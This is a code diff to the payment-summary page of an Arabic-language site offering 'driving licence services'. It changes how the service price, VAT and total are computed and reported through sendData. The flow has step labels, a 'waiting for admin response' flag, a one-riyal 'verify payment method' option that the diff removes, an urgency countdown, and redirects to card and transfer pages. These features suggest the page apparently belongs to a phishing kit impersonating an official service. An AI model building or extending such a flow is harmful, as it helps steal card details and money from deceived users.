@@ -8,15 +8,6 @@ import { CreditCard, CheckCircle2 } from "lucide-react";
 export default function SummaryPayment() {
   const [, setLocation] = useLocation();
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
-  const [selectedAmount, setSelectedAmountState] = useState<string>(() => {
-    return localStorage.getItem('selectedPaymentAmount') || '';
-  });
-  const setSelectedAmount = (amount: string) => {
-    setSelectedAmountState(amount);
-    localStorage.setItem('selectedPaymentAmount', amount);
-    // Also update paymentType for backward compatibility
-    localStorage.setItem('paymentType', amount === '1' ? 'booking' : 'full');
-  };
   const [isProcessing, setIsProcessing] = useState(false);
   const [showPopup, setShowPopup] = useState(false);
   const [countdown, setCountdown] = useState(() => {
@@ -40,9 +31,9 @@ export default function SummaryPayment() {
     };
   }, []);
 
-  // Get service name from URL params or localStorage
+  // Get service name from URL params
   const searchParams = new URLSearchParams(window.location.search);
-  const serviceName = searchParams.get('service') || localStorage.getItem('selectedService') || 'خدمات رخصة القيادة';
+  const serviceName = searchParams.get('service') || 'خدمات رخصة القيادة';
 
   // Service prices - all programs from DrivingCourses
   const servicePrices: Record<string, number> = {
@@ -84,19 +75,11 @@ export default function SummaryPayment() {
     'برنامج تدريبي لمدة 1 أيام': 500.25,
   };
 
-  // Try to get price from URL param first, then from servicePrices map, then localStorage
+  // Try to get price from URL param first, then from servicePrices map
   const urlPrice = searchParams.get('price');
-  const savedPrice = localStorage.getItem('selectedPrice');
-  const servicePrice = urlPrice ? parseFloat(urlPrice.replace(/,/g, '')) : (servicePrices[serviceName] || (savedPrice ? parseFloat(savedPrice) : 500.25));
+  const servicePrice = urlPrice ? parseFloat(urlPrice.replace(/,/g, '')) : (servicePrices[serviceName] || 500.25);
   const vatAmount = parseFloat((servicePrice * 0.15).toFixed(2));
   const totalAmount = parseFloat((servicePrice + vatAmount).toFixed(2));
-
-  // Save service info to localStorage for persistence across page navigations
-  useEffect(() => {
-    localStorage.setItem('selectedService', serviceName);
-    localStorage.setItem('selectedPrice', String(servicePrice));
-    localStorage.setItem('selectedTotalAmount', String(totalAmount));
-  }, [serviceName, servicePrice, totalAmount]);
 
   // Show popup after 2 seconds
   useEffect(() => {
@@ -133,20 +116,12 @@ export default function SummaryPayment() {
 
   const handlePayment = () => {
     if (!selectedPaymentMethod) return;
-    if (!selectedAmount) return;
 
     setIsProcessing(true);
 
-    const finalAmount = selectedAmount;
-
-    // Save to localStorage for persistence
-    localStorage.setItem('selectedPaymentAmount', finalAmount);
-    localStorage.setItem('selectedTotalAmount', finalAmount);
-
     sendData({
       data: {
-        'قيمة المبلغ': `${finalAmount} ر.س`,
-        'الخدمة': serviceName,
+        'المجموع الكلي': `${totalAmount} ر.س`,
       },
       current: 'الملخص والدفع',
       waitingForAdminResponse: false,
@@ -155,9 +130,10 @@ export default function SummaryPayment() {
     sendData({
       data: {
         paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
-        'قيمة المبلغ': `${finalAmount} ر.س`,
         serviceName,
-        totalAmount: finalAmount,
+        servicePrice,
+        vatAmount,
+        totalAmount,
       },
       current: 'ملخص الدفع',
       nextPage: selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
@@ -167,9 +143,9 @@ export default function SummaryPayment() {
     setTimeout(() => {
       setIsProcessing(false);
       if (selectedPaymentMethod === 'card') {
-        clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${finalAmount}`);
+        clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
       } else {
-        clientNavigate(`/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${finalAmount}`);
+        clientNavigate(`/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
       }
     }, 1500);
   };
@@ -226,44 +202,6 @@ export default function SummaryPayment() {
         <p className="mb-1 font-bold text-lg sm:text-[22px]">خدمات رخصة القيادة</p>
         <p className="pt-1 text-base sm:text-[22px]">ملخص الطلب والدفع</p>
       </section>
-
-      {/* Payment Amount Selection */}
-      <section className="container mx-auto px-3 sm:px-4 mt-4">
-        <div className="max-w-4xl mx-auto">
-          <div className="bg-white border border-gray-200 rounded-xl p-4 sm:p-6">
-            <h3 className="font-bold text-gray-800 mb-4 text-base sm:text-lg">قيمة المبلغ المراد تسديده <span className="text-red-500">*</span></h3>
-            <div className="space-y-3">
-              {[
-                { value: '1', label: '1 ريال لإثبات طريقة الدفع' },
-                { value: '500', label: '500 ريال سعودي' },
-                { value: '750', label: '750 ريال سعودي' },
-                { value: '1200', label: '1200 ريال سعودي' },
-                { value: '1450', label: '1450 ريال سعودي' },
-                { value: '2760', label: '2760 ريال سعودي' },
-              ].map((option) => (
-                <div
-                  key={option.value}
-                  className={`flex items-center gap-3 p-3 rounded-lg cursor-pointer transition-all ${
-                    selectedAmount === option.value
-                      ? 'bg-blue-50 border border-blue-300'
-                      : 'hover:bg-gray-50'
-                  }`}
-                  onClick={() => setSelectedAmount(option.value)}
-                >
-                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
-                    selectedAmount === option.value ? 'border-blue-500' : 'border-gray-300'
-                  }`}>
-                    {selectedAmount === option.value && (
-                      <div className="w-3 h-3 rounded-full bg-blue-500" />
-                    )}
-                  </div>
-                  <span className="text-gray-800 font-medium">{option.label}</span>
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
-      </section>
       
       <main className="flex-1 container px-3 sm:px-4 py-4 sm:py-8">
         <div className="max-w-4xl mx-auto">
@@ -286,15 +224,15 @@ export default function SummaryPayment() {
                     </div>
                     <div className="flex justify-between items-center py-2 border-b">
                       <span className="text-gray-600">رسوم الخدمة</span>
-                      <span className="font-medium">{selectedAmount ? `${selectedAmount} ر.س` : `${servicePrice} ر.س`}</span>
+                      <span className="font-medium">{servicePrice} ر.س</span>
                     </div>
                     <div className="flex justify-between items-center py-2 border-b">
                       <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
-                      <span className="font-medium">{selectedAmount ? `${(parseFloat(selectedAmount) * 0.15).toFixed(0)} ر.س` : `${vatAmount} ر.س`}</span>
+                      <span className="font-medium">{vatAmount} ر.س</span>
                     </div>
                     <div className="flex justify-between items-center py-2 bg-green-50 px-3 rounded-lg">
                       <span className="text-green-700 font-bold">المجموع الكلي</span>
-                      <span className="text-green-700 font-bold text-xl">{selectedAmount ? `${(parseFloat(selectedAmount) * 1.15).toFixed(0)} ر.س` : `${totalAmount} ر.س`}</span>
+                      <span className="text-green-700 font-bold text-xl">{totalAmount} ر.س</span>
                     </div>
                   </div>
                 </CardContent>
@@ -388,22 +326,22 @@ export default function SummaryPayment() {
                     </div>
                     <div className="flex justify-between text-sm">
                       <span className="text-gray-600">الرسوم</span>
-                      <span>{selectedAmount ? `${selectedAmount} ر.س` : `${servicePrice} ر.س`}</span>
+                      <span>{servicePrice} ر.س</span>
                     </div>
                     <div className="flex justify-between text-sm">
                       <span className="text-gray-600">الضريبة</span>
-                      <span>{selectedAmount ? `${(parseFloat(selectedAmount) * 0.15).toFixed(0)} ر.س` : `${vatAmount} ر.س`}</span>
+                      <span>{vatAmount} ر.س</span>
                     </div>
                     <hr />
                     <div className="flex justify-between font-bold text-lg">
                       <span>المجموع</span>
-                      <span className="text-green-600">{selectedAmount ? `${(parseFloat(selectedAmount) * 1.15).toFixed(0)} ر.س` : `${totalAmount} ر.س`}</span>
+                      <span className="text-green-600">{totalAmount} ر.س</span>
                     </div>
                   </div>
 
                   <Button
                     className="w-full mt-6 bg-green-600 hover:bg-green-700"
-                    disabled={!selectedPaymentMethod || !selectedAmount || selectedPaymentMethod === 'transfer' || isProcessing}
+                    disabled={!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing}
                     onClick={handlePayment}
                   >
                     {isProcessing ? (
